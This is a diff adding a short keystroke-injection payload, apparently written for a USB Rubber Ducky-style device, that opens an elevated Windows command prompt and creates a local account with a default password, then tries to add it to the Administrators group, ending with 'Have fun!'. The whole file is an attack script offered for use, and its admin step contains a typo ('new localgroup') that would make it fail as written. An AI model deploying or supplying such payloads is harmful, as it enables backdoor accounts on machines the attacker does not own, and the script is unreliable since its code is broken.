@@ -1,0 +1,14 @@
+REM Default username is username and password is password
+GUI r
+DELAY 500
+cmd
+CTRL SHIFT ENTER
+DELAY 1000
+net user /add username password
+DELAY 500
+ENTER
+DELAY 4000
+new localgroup administrators username /add
+DELAY 500
+ENTER
+REM You now have an Admin account with password! Have fun!
